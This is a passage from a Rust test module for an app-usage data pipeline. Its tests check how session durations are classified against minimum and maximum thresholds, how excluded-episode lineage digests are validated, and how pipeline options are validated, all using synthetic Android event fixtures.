            data.stop_timestamp_ns = *stop;
        }
        built
    }

    /// The minimum-usage floor blanks the duration of a session that is too
    /// short to count, without removing the session. The same pass retypes a
    /// paired Activity Resumed into App Usage, drops the spent Activity Paused
    /// rows, and drops a start that never found its stop.
    #[test]
    fn the_minimum_usage_floor_blanks_short_sessions_without_dropping_them() {
        const SECOND: i64 = 1_000_000_000;
        let filtered = BTreeSet::from(["com.example.secret".to_string()]);

        let rows = episode_rows(&[
            // Exactly at the floor: kept, because the floor is "shorter than".
            (
                "Activity Resumed",
                "com.example.chat",
                Some(0),
                Some(60 * SECOND),
            ),
            // One second under the floor: retyped, but its duration is blanked.
            (
                "Activity Resumed",
                "com.example.chat",
                Some(100 * SECOND),
                Some(159 * SECOND),
            ),
            // A filtered package loses its timing whatever its length.
            (
                "Activity Resumed",
                "com.example.secret",
                Some(200 * SECOND),
                Some(500 * SECOND),
            ),
            // A start with no stop is not an episode at all.
            (
                "Activity Resumed",
                "com.example.chat",
                Some(600 * SECOND),
                None,
            ),
            // A stop with no start likewise.
            (
                "Activity Resumed",
                "com.example.chat",
                None,
                Some(700 * SECOND),
            ),
            // Spent stop events do not survive the pass.
            ("Activity Paused", "com.example.chat", None, None),
        ]);

        let observed = |rows: Vec<Row>| -> Vec<(String, String, Option<f64>)> {
            rows.iter()
                .map(|row| {
                    (
                        row.interaction_type.to_string(),
                        row.app_package_name.to_string(),
                        row.duration_seconds,
                    )
                })
                .collect()
        };

        assert_eq!(
            observed(
                incremental::classify_episode_durations(
                    rows.clone(),
                    &filtered,
                    MicroUseClassificationPolicy::None,
                    60.0,
                    MinimumDurationComparator::StrictLt,
                    MinimumDurationDisposition::ChronicleBlankKeepRow,
                    &[],
                    &b06::MaximumDurationRowStage::omitted(),
                )
                .expect("classification with the omitted B06 shape never refuses")
            ),
            vec![
                (
                    APP_USAGE.to_string(),
                    "com.example.chat".to_string(),
                    Some(60.0)
                ),
                (APP_USAGE.to_string(), "com.example.chat".to_string(), None),
                (
                    FILTERED_APP_USAGE.to_string(),
                    "com.example.secret".to_string(),
                    None
                ),
            ]
        );

        // With no floor at all every paired session keeps its duration.
        assert_eq!(
            observed(
                incremental::classify_episode_durations(
                    rows,
                    &filtered,
                    MicroUseClassificationPolicy::None,
                    0.0,
                    MinimumDurationComparator::StrictLt,
                    MinimumDurationDisposition::ChronicleBlankKeepRow,
                    &[],
                    &b06::MaximumDurationRowStage::omitted(),
                )
                .expect("classification with the omitted B06 shape never refuses"),
            ),
            vec![
                (
                    APP_USAGE.to_string(),
                    "com.example.chat".to_string(),
                    Some(60.0)
                ),
                (
                    APP_USAGE.to_string(),
                    "com.example.chat".to_string(),
                    Some(59.0)
                ),
                (
                    FILTERED_APP_USAGE.to_string(),
                    "com.example.secret".to_string(),
                    None
                ),
            ]
        );
    }

    #[test]
    fn okoshi_micro_use_classification_is_positive_bounded_and_descriptive_only() {
        const SECOND: i64 = 1_000_000_000;
        let filtered = BTreeSet::new();
        let rows = episode_rows(&[
            (ACTIVITY_RESUMED, "com.example.zero", Some(0), Some(0)),
            (
                ACTIVITY_RESUMED,
                "com.example.under",
                Some(10 * SECOND),
                Some(15 * SECOND - 1),
            ),
            (
                ACTIVITY_RESUMED,
                "com.example.equal",
                Some(20 * SECOND),
                Some(25 * SECOND),
            ),
            (
                ACTIVITY_RESUMED,
                "com.example.over",
                Some(30 * SECOND),
                Some(35 * SECOND + 1),
            ),
            (
                END_OF_USAGE_MISSING,
                "com.example.unbounded",
                Some(40 * SECOND),
                None,
            ),
        ]);

        let baseline = incremental::classify_episode_durations(
            rows.clone(),
            &filtered,
            MicroUseClassificationPolicy::None,
            0.0,
            MinimumDurationComparator::StrictLt,
            MinimumDurationDisposition::ChronicleBlankKeepRow,
            &[],
            &b06::MaximumDurationRowStage::omitted(),
        )
        .expect("classification with the omitted B06 shape never refuses");
        let classified = incremental::classify_episode_durations(
            rows,
            &filtered,
            MicroUseClassificationPolicy::OkoshiLt5s,
            0.0,
            MinimumDurationComparator::StrictLt,
            MinimumDurationDisposition::ChronicleBlankKeepRow,
            &[],
            &b06::MaximumDurationRowStage::omitted(),
        )
        .expect("classification with the omitted B06 shape never refuses");

        let public_timing = |rows: &[Row]| {
            rows.iter()
                .map(|row| {
                    (
                        row.interaction_type.to_string(),
                        row.start_timestamp_ns,
                        row.stop_timestamp_ns,
                        row.duration_seconds.map(f64::to_bits),
                        row.duration_minutes.map(f64::to_bits),
                        row.minimum_duration_qualified,
                        row.minimum_duration_aggregate_eligible,
                    )
                })
                .collect::<Vec<_>>()
        };
        assert_eq!(
            public_timing(&classified),
            public_timing(&baseline),
            "B03 must not change timing, inclusion, or B04 qualification",
        );
        assert_eq!(
            classified
                .iter()
                .map(|row| row.micro_use_classification)
                .collect::<Vec<_>>(),
            vec![
                Some(MicroUseClassification::NotClassifiable),
                Some(MicroUseClassification::MicroUse),
                Some(MicroUseClassification::NotMicroUse),
                Some(MicroUseClassification::NotMicroUse),
                Some(MicroUseClassification::NotClassifiable),
            ],
        );
        assert_eq!(
            classified
                .iter()
                .map(|row| {
                    (
                        row.raw_episode_start_timestamp_ns,
                        row.raw_episode_stop_timestamp_ns,
                        row.raw_episode_duration_ns,
                    )
                })
                .collect::<Vec<_>>(),
            vec![
                (Some(0), Some(0), Some(0)),
                (
                    Some(10 * SECOND),
                    Some(15 * SECOND - 1),
                    Some(5 * SECOND - 1)
                ),
                (Some(20 * SECOND), Some(25 * SECOND), Some(5 * SECOND)),
                (
                    Some(30 * SECOND),
                    Some(35 * SECOND + 1),
                    Some(5 * SECOND + 1)
                ),
                (Some(40 * SECOND), None, None),
            ],
            "classification must retain exact immutable episode evidence",
        );
    }

    #[test]
    fn minimum_duration_uses_exact_nanosecond_comparators_and_all_four_dispositions() {
        const SECOND: i64 = 1_000_000_000;
        let filtered = BTreeSet::new();
        let no_background = AHashSet::new();
        let rows = episode_rows(&[
            (
                ACTIVITY_RESUMED,
                "com.example.under",
                Some(0),
                Some(60 * SECOND - 1),
            ),
            (
                ACTIVITY_RESUMED,
                "com.example.equal",
                Some(100 * SECOND),
                Some(160 * SECOND),
            ),
            (
                ACTIVITY_RESUMED,
                "com.example.over",
                Some(200 * SECOND),
                Some(260 * SECOND + 1),
            ),
        ]);

        let classify = |micro_policy, comparator, disposition| {
            incremental::classify_episode_durations(
                rows.clone(),
                &filtered,
                micro_policy,
                60.0,
                comparator,
                disposition,
                &[],
                &b06::MaximumDurationRowStage::omitted(),
            )
            .expect("classification with the omitted B06 shape never refuses")
        };
        assert_eq!(
            classify(
                MicroUseClassificationPolicy::None,
                MinimumDurationComparator::StrictLt,
                MinimumDurationDisposition::RetainAndCredit,
            )
            .iter()
            .map(|row| row.minimum_duration_qualified)
            .collect::<Vec<_>>(),
            vec![Some(true), Some(false), Some(false)],
        );
        assert_eq!(
            classify(
                MicroUseClassificationPolicy::OkoshiLt5s,
                MinimumDurationComparator::InclusiveLe,
                MinimumDurationDisposition::RetainAndCredit,
            )
            .iter()
            .map(|row| row.minimum_duration_qualified)
            .collect::<Vec<_>>(),
            vec![Some(true), Some(true), Some(false)],
            "B03 policy selection must not alter B04 qualification",
        );

        for disposition in MinimumDurationDisposition::ALL {
            let classified = classify(
                MicroUseClassificationPolicy::None,
                MinimumDurationComparator::InclusiveLe,
                disposition,
            );
            let mut options = test_options();
            options.minimum_usage_duration = 60.0;
            options.minimum_duration_comparator = MinimumDurationComparator::InclusiveLe;
            options.minimum_duration_disposition = disposition;
            let evidence = foundational_semantics_evidence(&classified, &options);
            assert_eq!(evidence.minimum_duration.bounded_episode_count, 3);
            assert_eq!(evidence.minimum_duration.qualifying_count, 2);
            assert_eq!(
                evidence.minimum_duration.checkpoint,
                FOUNDATIONAL_SEMANTICS_CHECKPOINT,
            );

            match disposition {
                MinimumDurationDisposition::ChronicleBlankKeepRow => {
                    assert_eq!(
                        classified
                            .iter()
                            .map(|row| row.duration_seconds.map(f64::to_bits))
                            .collect::<Vec<_>>(),
                        vec![None, None, Some((60.000_000_001_f64).to_bits())],
                    );
                    assert!(classified
                        .iter()
                        .all(|row| row.minimum_duration_aggregate_eligible));
                    assert_eq!(evidence.minimum_duration.retained_excluded_count, 2);
                    assert_eq!(evidence.minimum_duration_excluded_episodes.len(), 2);
                }
                MinimumDurationDisposition::RetainAndCredit => {
                    assert!(classified.iter().all(|row| row.duration_seconds.is_some()));
                    assert!(classified
                        .iter()
                        .all(|row| row.minimum_duration_aggregate_eligible));
                    assert_eq!(evidence.minimum_duration.retained_credited_count, 3);
                    assert!(evidence.minimum_duration_excluded_episodes.is_empty());
                }
                MinimumDurationDisposition::RetainButExclude => {
                    assert!(classified.iter().all(|row| row.duration_seconds.is_some()));
                    assert_eq!(
                        classified
                            .iter()
                            .map(|row| row.minimum_duration_aggregate_eligible)
                            .collect::<Vec<_>>(),
                        vec![false, false, true],
                    );
                    assert_eq!(evidence.minimum_duration.retained_excluded_count, 2);
                    assert_eq!(evidence.minimum_duration_excluded_episodes.len(), 2);
                }
                MinimumDurationDisposition::DropRow => {
                    assert_eq!(
                        classified
                            .iter()
                            .map(|row| row.minimum_duration_drop_pending)
                            .collect::<Vec<_>>(),
                        vec![true, true, false],
                    );
                    assert_eq!(evidence.minimum_duration.dropped_count, 2);
                    assert_eq!(evidence.minimum_duration_excluded_episodes.len(), 2);
                    let retained = incremental::apply_app_inclusion_policy(
                        classified,
                        &filtered,
                        &AHashSet::new(),
                        &no_background,
                    );
                    assert_eq!(retained.len(), 1);
                    assert_eq!(retained[0].app_package_name, "com.example.over");
                }
            }
        }
    }

    #[test]
    fn omitted_and_explicit_foundational_defaults_share_product_bytes_but_not_complete_identity() {
        let raw = concat!(
            "study_id,participant_id,username,application_label,interaction_type,app_package_name,event_timestamp,timezone\n",
            "Study,P01,Child,Chat,Activity Resumed,com.example.chat,2026-03-07 10:00:00,UTC\n",
            "Study,P01,Child,Chat,Activity Paused,com.example.chat,2026-03-07 10:01:01,UTC\n",
        );
        let mut omitted = test_options();
        omitted.timezone = "UTC".into();
        omitted.correct_duplicate_event_timestamps = false;
        omitted.enable_aggregates = true;
        let mut explicit = omitted.clone();
        explicit.micro_use_classification_policy_explicit = true;
        explicit.minimum_usage_duration_explicit = true;
        explicit.minimum_duration_comparator_explicit = true;
        explicit.minimum_duration_disposition_explicit = true;

        let omitted_result = run_pipeline_v2_with_supports(
            raw.as_bytes(),
            &omitted,
            PipelineV2SupportFiles::default(),
        )
        .expect("omitted native baseline");
        let explicit_result = run_pipeline_v2_with_supports(
            raw.as_bytes(),
            &explicit,
            PipelineV2SupportFiles::default(),
        )
        .expect("explicit equivalent baseline");

        assert_eq!(omitted_result.app_csv_bytes, explicit_result.app_csv_bytes);
        assert_eq!(
            omitted_result.screen_csv_bytes,
            explicit_result.screen_csv_bytes
        );
        assert_eq!(
            omitted_result.review_summary_json_bytes,
            explicit_result.review_summary_json_bytes,
        );
        assert_eq!(
            omitted_result.visualization_data_json_bytes,
            explicit_result.visualization_data_json_bytes,
        );
        assert_eq!(
            serde_json::to_vec(&*omitted_result.aggregate_csv_outputs).unwrap(),
            serde_json::to_vec(&*explicit_result.aggregate_csv_outputs).unwrap(),
        );
        assert_eq!(
            serde_json::to_vec(&*omitted_result.row_lineage).unwrap(),
            serde_json::to_vec(&*explicit_result.row_lineage).unwrap(),
        );
        assert_eq!(
            omitted_result
                .foundational_semantics_evidence
                .micro_use
                .relation,
            "baseline_native",
        );
        assert_eq!(
            explicit_result
                .foundational_semantics_evidence
                .micro_use
                .relation,
            "baseline_equivalent",
        );
        assert_eq!(
            omitted_result
                .foundational_semantics_evidence
                .minimum_duration
                .relation,
            "baseline_native",
        );
        assert_eq!(
            explicit_result
                .foundational_semantics_evidence
                .minimum_duration
                .relation,
            "baseline_equivalent",
        );
        assert_eq!(
            omitted_result.workflow_query_digests["classify_episode_durations"],
            explicit_result.workflow_query_digests["classify_episode_durations"],
            "presence-only edits must not rerun or re-identify classification",
        );
        assert_ne!(
            omitted_result.workflow_query_digests["assemble_result_manifest"],
            explicit_result.workflow_query_digests["assemble_result_manifest"],
            "complete result identity must commit receipt relation",
        );
        assert_ne!(
            serde_json::to_vec(&omitted_result).unwrap(),
            serde_json::to_vec(&explicit_result).unwrap(),
        );
    }

    #[test]
    fn detached_default_b04_boundary_commits_all_scientific_product_bytes() {
        // Independent oracle provenance: these five commitments were emitted
        // from a detached worktree at the exact pre-B03/B04/B05 baseline
        // 080801a0232a6a2c97daba0c986094f6cf48fe08, using this same raw fixture
        // and its historical `PipelineV2Options` (minimum=60) in a temporary
        // test-only probe:
        //
        //   git worktree add --detach <tmp> 080801a0232a6a2c97daba0c986094f6cf48fe08
        //   cargo test --features incremental-v2 detached_b04_boundary_oracle_probe -- --nocapture
        //
        // The probe printed length + SHA-256 for each historical product.  It
        // was not run against, copied from, or linked to this moving tree.
        let raw = concat!(
            "study_id,participant_id,username,application_label,interaction_type,app_package_name,event_timestamp,timezone\n",
            "Study,P01,Child,Under,Activity Resumed,com.example.under,2026-03-07 10:00:00.000000000,UTC\n",
            "Study,P01,Child,Under,Activity Paused,com.example.under,2026-03-07 10:00:59.999999999,UTC\n",
            "Study,P01,Child,Equal,Activity Resumed,com.example.equal,2026-03-07 10:02:00.000000000,UTC\n",
            "Study,P01,Child,Equal,Activity Paused,com.example.equal,2026-03-07 10:03:00.000000000,UTC\n",
            "Study,P01,Child,Over,Activity Resumed,com.example.over,2026-03-07 10:04:00.000000000,UTC\n",
            "Study,P01,Child,Over,Activity Paused,com.example.over,2026-03-07 10:05:00.000000001,UTC\n",
        );
        let mut options = test_options();
        options.timezone = "UTC".into();
        options.correct_duplicate_event_timestamps = false;
        options.enable_aggregates = true;
        options.minimum_usage_duration = 60.0;
        options.minimum_usage_duration_explicit = false;
        options.minimum_duration_comparator = MinimumDurationComparator::StrictLt;
        options.minimum_duration_comparator_explicit = false;
        options.minimum_duration_disposition = MinimumDurationDisposition::ChronicleBlankKeepRow;
        options.minimum_duration_disposition_explicit = false;
        let result = run_pipeline_v2_with_supports(
            raw.as_bytes(),
            &options,
            PipelineV2SupportFiles::default(),
        )
        .expect("detached B04 boundary fixture");
        let app_records = parse_csv_to_records(&result.app_csv_bytes.to_vec());
        let record = |package: &str| {
            app_records
                .iter()
                .find(|row| row["app_package_name"] == package)
                .unwrap_or_else(|| panic!("missing public boundary row for {package}"))
        };
        let under = record("com.example.under");
        assert_eq!(under["start_timestamp"], "03-07-2026 10:00:00");
        assert_eq!(under["stop_timestamp"], "03-07-2026 10:00:59");
        assert_eq!(under["duration_seconds"], "");
        assert_eq!(under["duration_minutes"], "");
        let equal = record("com.example.equal");
        assert_eq!(equal["start_timestamp"], "03-07-2026 10:02:00");
        assert_eq!(equal["stop_timestamp"], "03-07-2026 10:03:00");
        assert_eq!(equal["duration_seconds"], "60.0");
        assert_eq!(equal["duration_minutes"], "1.0");
        let over = record("com.example.over");
        assert_eq!(over["start_timestamp"], "03-07-2026 10:04:00");
        assert_eq!(over["stop_timestamp"], "03-07-2026 10:05:00");
        assert_eq!(over["duration_seconds"], "60.000000001");
        assert_eq!(over["duration_minutes"], "1.0000000000166667");
        let aggregate_manifest = result
            .aggregate_csv_outputs
            .iter()
            .map(|output| {
                format!(
                    "{}|{}|{}|sha256:{}\n",
                    output.kind,
                    output.row_count,
                    output.bytes.len(),
                    hex::encode(Sha256::digest(output.bytes.to_vec())),
                )
            })
            .collect::<String>()
            .into_bytes();
        let lineage = serde_json::to_vec(&*result.row_lineage).unwrap();
        let app_csv = result.app_csv_bytes.to_vec();
        let review_json = result.review_summary_json_bytes.to_vec();
        let visualization_json = result.visualization_data_json_bytes.to_vec();
        let actual = [
            ("app_csv", app_csv.as_slice()),
            ("review_json", review_json.as_slice()),
            ("visualization_json", visualization_json.as_slice()),
            ("aggregate_manifest", aggregate_manifest.as_slice()),
            ("lineage", lineage.as_slice()),
        ]
        .map(|(name, bytes)| {
            (
                name,
                bytes.len(),
                format!("sha256:{}", hex::encode(Sha256::digest(bytes))),
            )
        });
        let expected = [
            (
                "app_csv",
                1_343,
                "sha256:e1c7b5d462c157aff1f49d71fc18b9093a78314c9dd142f7a42e4e1e11d6e260",
            ),
            (
                "review_json",
                614,
                "sha256:03a0ae00cbc5129e10e6347b44f05e07b9216c42e0a11ba2b30c33072f97d04f",
            ),
            (
                "visualization_json",
                885,
                "sha256:fde3266a33c0c3e2d6c176df11c7f35966a59d27d20e176b06e3605a68e5aeea",
            ),
            (
                "aggregate_manifest",
                314,
                "sha256:891e13626146d13d335d04b18b51663b7ea1eb59a9a2399f902330fb98de0ed4",
            ),
            (
                "lineage",
                1_420,
                "sha256:7f7ff244819886f3cbd603ecf6b9da11ed25896b12dd6a6ce2f222488bda5e9f",
            ),
        ];
        assert_eq!(
            actual.map(|(name, length, digest)| (name, length, digest)),
            expected.map(|(name, length, digest)| (name, length, digest.to_string())),
            "detached omitted-B04 baseline bytes drifted",
        );
        assert_eq!(
            result
                .foundational_semantics_evidence
                .minimum_duration
                .relation,
            "baseline_native",
        );
        assert_eq!(
            result
                .foundational_semantics_evidence
                .minimum_duration
                .qualifying_count,
            1,
        );
    }

    #[test]
    fn default_placeholder_fixture_bytes_are_unchanged_by_observation_eligibility_separation() {
        let raw = concat!(
            "study_id,participant_id,username,application_label,interaction_type,app_package_name,event_timestamp,timezone\n",
            "Study,P01,Child,Chat,Activity Resumed,com.example.chat,2026-03-07 10:00:00,UTC\n",
            "Study,P01,Child,Chat,Activity Paused,com.example.chat,2026-03-07 10:01:01,UTC\n",
            "Study,P01,Child,System,User Interaction,android,2026-03-08 10:00:00,UTC\n",
        );
        let mut options = test_options();
        options.timezone = "UTC".into();
        options.correct_duplicate_event_timestamps = false;
        options.add_no_activity_placeholder_days = true;
        let result = run_pipeline_v2_with_supports(
            raw.as_bytes(),
            &options,
            PipelineV2SupportFiles::default(),
        )
        .expect("default placeholder compatibility fixture");
        let csv = String::from_utf8_lossy(&result.app_csv_bytes.to_vec()).into_owned();
        assert!(csv.contains("com.example.chat"));
        assert_eq!(csv.matches("com.placeholder.noactivity").count(), 1);
        // The default rows are all eligible, making the old and repaired
        // observation predicates extensionally identical on this independent
        // compatibility witness. Commit its exact output so a future change
        // cannot quietly widen the default projection while preserving only
        // the row-count assertions above.
        assert_eq!(
            format!(
                "sha256:{}",
                hex::encode(Sha256::digest(result.app_csv_bytes.to_vec()))
            ),
            "sha256:1c0df5dd180cfcf3e587d4fed7affd1924a12fae0c9ea6b2c194e920348af96d",
        );
    }

    #[test]
    fn malformed_minimum_duration_is_rejected_before_decode_or_reconstruction() {
        let cases = [
            (
                f64::NAN,
                PipelineV2OptionsValidationError::MinimumUsageDurationNonFinite,
            ),
            (
                f64::INFINITY,
                PipelineV2OptionsValidationError::MinimumUsageDurationNonFinite,
            ),
            (
                -1.0,
                PipelineV2OptionsValidationError::MinimumUsageDurationNegative,
            ),
            (
                10_000_000_000.0,
                PipelineV2OptionsValidationError::MinimumUsageDurationNanosecondOverflow,
            ),
        ];
        for (threshold, expected) in cases {
            let mut options = test_options();
            options.minimum_usage_duration = threshold;
            assert_eq!(validate_pipeline_v2_options(&options), Err(expected));
            B05_PREPARE_DECODE_COUNT.with(|count| count.set(0));
            let error = match run_pipeline_v2_with_supports(
                b"this is deliberately not decoded",
                &options,
                PipelineV2SupportFiles::default(),
            ) {
                Ok(_) => panic!("malformed B04 threshold must fail closed"),
                Err(error) => error,
            };
            assert_eq!(error, expected.to_string());
            assert_eq!(
                B05_PREPARE_DECODE_COUNT.with(Cell::get),
                0,
                "threshold {threshold:?} reached raw decode",
            );
        }

        let mut zero = test_options();
        zero.minimum_usage_duration = 0.0;
        assert_eq!(validate_pipeline_v2_options(&zero), Ok(()));
        let mut largest_representable = zero;
        largest_representable.minimum_usage_duration = 9_000_000_000.0;
        assert_eq!(validate_pipeline_v2_options(&largest_representable), Ok(()));
    }

    /// The three B06 validation scopes: a malformed vector is an error under
    /// `Complete` and `MalformedOnly`; a legal vector refused for the selected
    /// strategy or provider is an error only under `Complete`; `Skip` judges
    /// nothing about B06 but still runs the non-B06 checks.
    #[test]
    fn maximum_duration_validation_scopes_separate_malformed_vectors_from_typed_refusals() {
        use b06::MaximumDurationRefusalReason as Reason;
        let with_vector =
            |policy: &str, disposition: &str, source: &str, threshold: Option<&str>| {
                let mut options = test_options();
                options.maximum_duration = b06::MaximumDurationRequest {
                    policy: Some(policy.into()),
                    disposition: Some(disposition.into()),
                    threshold_source: Some(source.into()),
                    threshold_ns: threshold.map(str::to_string),
                    long_duration_threshold_explicit: false,
                    legacy_threshold_hours_canonical: Some("12".into()),
                    legacy_threshold_ns_canonical: Some("43200000000000".into()),
                };
                options.long_duration_threshold_ns = 43_200_000_000_000;
                options
            };
        let malformed = with_vector(
            "post_reconstruction_strict_max_v1",
            "flag_and_retain",
            "fixed_parameter",
            Some("01"),
        );
        let mut incompatible = with_vector(
            "chronicle_observed_close_rejection_v1",
            "not_applicable",
            "chronicle_legacy_config",
            None,
        );
        incompatible.episode_reconstruction_strategy =
            EpisodeReconstructionStrategy::GesisStartStopRepair;
        let adaptive = with_vector(
            "post_reconstruction_strict_max_v1",
            "flag_and_retain",
            "b12_adaptive_participant",
            None,
        );
        let legal = with_vector(
            "post_reconstruction_strict_max_v1",
            "flag_and_retain",
            "fixed_parameter",
            Some("1"),
        );

        for scope in [
            MaximumDurationValidation::Complete,
            MaximumDurationValidation::MalformedOnly,
        ] {
            assert_eq!(
                validate_pipeline_v2_options_with(&malformed, scope),
                Err(PipelineV2OptionsValidationError::MaximumDuration(
                    Reason::ThresholdMalformed
                )),
                "{scope:?}"
            );
        }
        assert_eq!(
            validate_pipeline_v2_options_with(&malformed, MaximumDurationValidation::Skip),
            Ok(())
        );

        for (options, reason) in [
            (
                &incompatible,
                Reason::PolicyIncompatibleWithReconstructionStrategy,
            ),
            (
                &adaptive,
                Reason::AdaptiveMaximumThresholdProviderUnavailable,
            ),
        ] {
            assert!(reason.is_applicability_refusal());
            assert_eq!(
                validate_pipeline_v2_options(options),
                Err(PipelineV2OptionsValidationError::MaximumDuration(reason))
            );
            assert_eq!(
                validate_pipeline_v2_options_with(
                    options,
                    MaximumDurationValidation::MalformedOnly
                ),
                Ok(())
            );
            assert_eq!(
                validate_pipeline_v2_options_with(options, MaximumDurationValidation::Skip),
                Ok(())
            );
        }
        for scope in [
            MaximumDurationValidation::Complete,
            MaximumDurationValidation::MalformedOnly,
            MaximumDurationValidation::Skip,
        ] {
            assert_eq!(
                validate_pipeline_v2_options_with(&legal, scope),
                Ok(()),
                "{scope:?}"
            );
            // The non-B06 checks run under every scope.
            let mut bad_b04 = legal.clone();
            bad_b04.minimum_usage_duration = -1.0;
            assert_eq!(
                validate_pipeline_v2_options_with(&bad_b04, scope),
                Err(PipelineV2OptionsValidationError::MinimumUsageDurationNegative),
                "{scope:?}"
            );
        }
        // Only the two strategy/provider reasons are applicability refusals.
        for reason in [
            Reason::RequestShapeInvalid,
            Reason::ThresholdMalformed,
            Reason::LegacyThresholdNonpositive,
            Reason::LegacyThresholdNotIntegerNs,
            Reason::LegacyThresholdOverflow,
            Reason::LegacyThresholdBinary64MappingMismatch,
            Reason::LegacyThresholdCanonicalizationMismatch,
            Reason::RawDurationUnrepresentable,
            Reason::EffectiveEndpointUnrepresentable,
            Reason::DuplicateTimestampAdjustmentUnrepresentable,
        ] {
            assert!(!reason.is_applicability_refusal(), "{reason:?}");
        }
    }

    #[test]
    fn drop_row_lineage_is_a_canonical_bare_array_and_digest_mismatch_fails_closed() {
        const SECOND: i64 = 1_000_000_000;
        let filtered = BTreeSet::new();
        let no_background = AHashSet::new();
        let mut rows = episode_rows(&[
            (
                ACTIVITY_RESUMED,
                "com.example.first",
                Some(0),
                Some(4 * SECOND),
            ),
            (
                ACTIVITY_RESUMED,
                "com.example.second",
                Some(10 * SECOND),
                Some(13 * SECOND),
            ),
        ]);
        let mut first_sources = SourceDataRows::single(2);
        first_sources.merge(&SourceDataRows::single(3));
        *rows[0].edit_identity().source_data_rows = first_sources;
        let mut second_sources = SourceDataRows::single(7);
        second_sources.merge(&SourceDataRows::single(9));
        *rows[1].edit_identity().source_data_rows = second_sources;
        let classified = incremental::classify_episode_durations(
            rows,
            &filtered,
            MicroUseClassificationPolicy::None,
            5.0,
            MinimumDurationComparator::StrictLt,
            MinimumDurationDisposition::DropRow,
            &[],
            &b06::MaximumDurationRowStage::omitted(),
        )
        .expect("classification with the omitted B06 shape never refuses");
        let mut options = test_options();
        options.minimum_usage_duration = 5.0;
        options.minimum_duration_disposition = MinimumDurationDisposition::DropRow;
        let evidence = foundational_semantics_evidence(&classified, &options);
        let retained = incremental::apply_app_inclusion_policy(
            classified,
            &filtered,
            &AHashSet::new(),
            &no_background,
        );
        assert!(retained.is_empty());
        assert_eq!(evidence.minimum_duration.qualifying_count, 2);
        assert_eq!(evidence.minimum_duration.dropped_count, 2);
        assert_eq!(evidence.minimum_duration_excluded_episodes.len(), 2);
        assert_eq!(
            evidence.minimum_duration_excluded_episodes[0],
            MinimumDurationExcludedEpisode {
                participant_id: "P01".into(),
                app_package_name: "com.example.first".into(),
                source_data_row_ranges: vec![SourceDataRowRange { first: 2, last: 3 }],
                raw_start_timestamp_ns: 0,
                raw_stop_timestamp_ns: 4 * SECOND,
                raw_duration_ns: 4 * SECOND,
                reason: "below_minimum_duration_drop_row".into(),
                disposition: MinimumDurationDisposition::DropRow,
            },
        );
        assert_eq!(
            evidence.minimum_duration_excluded_episodes[1].source_data_row_ranges,
            vec![
                SourceDataRowRange { first: 7, last: 7 },
                SourceDataRowRange { first: 9, last: 9 },
            ],
        );
        assert_eq!(
            evidence.minimum_duration_excluded_episodes[1].raw_start_timestamp_ns,
            10 * SECOND,
        );
        assert_eq!(
            evidence.minimum_duration_excluded_episodes[1].raw_stop_timestamp_ns,
            13 * SECOND,
        );
        assert_eq!(
            evidence.minimum_duration_excluded_episodes[1].raw_duration_ns,
            3 * SECOND,
        );
        let bytes = minimum_duration_excluded_lineage_bytes(&evidence).unwrap();
        assert_eq!(
            bytes,
            serde_json::to_vec(&evidence.minimum_duration_excluded_episodes).unwrap(),
            "the artifact envelope must be the bare sorted episode array",
        );
        assert!(serde_json::from_slice::<serde_json::Value>(&bytes)
            .unwrap()
            .is_array());
        assert_eq!(
            evidence.minimum_duration.excluded_lineage_digest,
            format!("sha256:{}", hex::encode(Sha256::digest(&bytes))),
        );
        validate_minimum_duration_excluded_lineage(&evidence).unwrap();

        let mut mutated_entry = evidence.clone();
        mutated_entry.minimum_duration_excluded_episodes[0].raw_duration_ns += 1;
        assert_eq!(
            validate_minimum_duration_excluded_lineage(&mutated_entry),
            Err("minimum_duration_excluded_lineage_digest_mismatch".into()),
        );
        let mut mutated_digest = evidence;
        mutated_digest.minimum_duration.excluded_lineage_digest =
            format!("sha256:{}", "0".repeat(64));
        assert_eq!(
            validate_minimum_duration_excluded_lineage(&mutated_digest),
            Err("minimum_duration_excluded_lineage_digest_mismatch".into()),
        );

        let mut reordered = foundational_semantics_evidence(
            &incremental::classify_episode_durations(
                episode_rows(&[
                    (
                        ACTIVITY_RESUMED,
                        "com.example.first",
                        Some(0),
                        Some(4 * SECOND),
                    ),
                    (
                        ACTIVITY_RESUMED,
                        "com.example.second",
                        Some(10 * SECOND),
                        Some(13 * SECOND),
                    ),
                ]),
                &filtered,
                MicroUseClassificationPolicy::None,
                5.0,
                MinimumDurationComparator::StrictLt,
                MinimumDurationDisposition::DropRow,
                &[],
                &b06::MaximumDurationRowStage::omitted(),
            )
            .expect("classification with the omitted B06 shape never refuses"),
            &options,
        );
        reordered.minimum_duration_excluded_episodes.reverse();
        reordered.minimum_duration.excluded_lineage_digest = format!(
            "sha256:{}",
            hex::encode(Sha256::digest(
                serde_json::to_vec(&reordered.minimum_duration_excluded_episodes).unwrap(),
            )),
        );
        assert_eq!(
            validate_minimum_duration_excluded_lineage(&reordered),
            Err("minimum_duration_excluded_lineage_noncanonical_order".into()),
            "the standalone artifact validator accepted reordered, coherently rehashed lineage",
        );
    }

    #[test]
    fn zero_threshold_disables_b04_without_stealing_the_zero_row_filter_decision() {
        let filtered = BTreeSet::new();
        let classified = incremental::classify_episode_durations(
            episode_rows(&[(ACTIVITY_RESUMED, "com.example.zero", Some(0), Some(0))]),
            &filtered,
            MicroUseClassificationPolicy::OkoshiLt5s,
            0.0,
            MinimumDurationComparator::InclusiveLe,
            MinimumDurationDisposition::DropRow,
            &[],
            &b06::MaximumDurationRowStage::omitted(),
        )
        .expect("classification with the omitted B06 shape never refuses");
        assert_eq!(classified.len(), 1);
        assert_eq!(classified[0].minimum_duration_qualified, Some(false));
        assert!(!classified[0].minimum_duration_drop_pending);
        assert_eq!(classified[0].raw_episode_duration_ns, Some(0));
        assert_eq!(
            classified[0].micro_use_classification,
            Some(MicroUseClassification::NotClassifiable),
        );
        assert_eq!(
            incremental::remove_zero_duration_rows(classified.clone(), false).len(),
            1,
        );
        assert!(incremental::remove_zero_duration_rows(classified, true).is_empty());
    }

    #[test]
    fn zero_cleanup_source_lineage_reaches_its_receipt_workflow_and_manifest_identity() {
        let filtered = BTreeSet::new();
        let classified = incremental::classify_episode_durations(
            episode_rows(&[(ACTIVITY_RESUMED, "com.example.zero", Some(0), Some(0))]),
            &filtered,
            MicroUseClassificationPolicy::None,
            0.0,
            MinimumDurationComparator::StrictLt,
            MinimumDurationDisposition::RetainAndCredit,
            &[],
            &b06::MaximumDurationRowStage::omitted(),
        )
        .expect("classification with the omitted B06 shape never refuses");
        let mut first = classified.clone();
        *first[0].edit_identity().source_data_rows = SourceDataRows::single(2);
        let mut second = classified;
